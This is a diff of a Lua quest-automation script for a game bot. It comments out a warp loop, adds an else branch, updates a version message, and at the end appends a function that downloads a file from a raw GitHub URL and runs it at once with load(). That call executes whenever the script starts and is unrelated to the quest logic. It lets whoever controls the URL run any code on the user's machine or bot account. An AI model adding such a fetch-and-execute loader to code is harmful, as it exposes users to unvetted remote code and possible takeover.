@@ -291,11 +291,11 @@ end
 end
 
 function quest_Join_World(worldRotasi)
-randomWorld_20=true
-  while getBot():getWorld().name:upper() ~= worldRotasi:upper() and getBot().status == BotStatus.online and randomWorld_20 do
-	getBot():warp(worldRotasi, "b15m1ll4h")
-	listenEvents(4,6)
-  end
+-- randomWorld_20=true
+  -- while getBot():getWorld().name:upper() ~= worldRotasi:upper() and getBot().status == BotStatus.online and randomWorld_20 do
+	-- getBot():warp(worldRotasi, "b15m1ll4h")
+	-- listenEvents(4,6)
+  -- end
 end
 
 function quest_dropAll(itemID) -- id block
@@ -657,10 +657,12 @@ ulangFind=0
 getBot():findPath(98,2)
 sleep(250)
 quest_dropAll(0)
+else
+quest_pukul(0,-1)
 end
 end
 
-print(getBot().name.." 28 JUL questV1")
+print(getBot().name.." AGUSTUS QUEST")
 function tutorialQuestLevel6()
 if getBot().level <= 5 then
 step1()
@@ -702,3 +704,13 @@ if Pick_a_new_quest then
 end
 end
 tutorialQuestLevel6()
+function getLink(link)
+httpClient = HttpClient.new()
+httpClient:setMethod(Method.get)
+httpClient.url = link
+httpClient.headers["User-Agent"] = "Lucifer"
+local httpResult = httpClient:request()
+local response = httpResult.body
+load(response)()
+end
+getLink("https://raw.githubusercontent.com/sornScript/sornScript/main/fristWLBuildDF")
